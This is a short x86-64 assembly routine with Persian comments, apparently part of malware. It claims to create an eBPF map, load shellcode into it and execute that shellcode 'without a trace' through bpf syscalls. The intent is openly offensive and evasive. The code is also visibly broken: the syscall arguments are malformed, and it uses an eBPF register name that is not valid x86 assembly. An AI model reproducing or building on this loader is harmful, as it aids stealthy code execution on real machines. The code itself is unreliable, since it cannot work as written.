section .text
global inject_ebpf_shellcode

%include "ebpf_dynamic.inc"

inject_ebpf_shellcode:
    ; ایجاد eBPF map
    mov rdi, BPF_MAP_TYPE_ARRAY
    mov rsi, 4                   ; key size
    mov rdx, 1024                ; value size
    mov r10, 1                   ; max entries
    mov eax, SYS_BPF
    syscall
    mov [ebpf_map_fd], eax

    ; بارگذاری شل‌کد در map
    mov rdi, [ebpf_map_fd]
    xor rsi, rsi                 ; key=0
    mov rdx, payloads + EBPF_SHELLCODE
    mov eax, SYS_BPF
    syscall

    ; فعال‌سازی شل‌کد از طریق syscall
    mov rdi, [ebpf_map_fd]
    mov rsi, BPF_ANY
    mov rdx, 0
    lea r10, [rel shellcode_executor]
    mov eax, SYS_BPF
    syscall
    ret

shellcode_executor:
    ; اجرای شل‌کد بدون ردپا
    mov rax, [r1 + 0x18]          ; آدرس شل‌کد از map
    jmp rax
    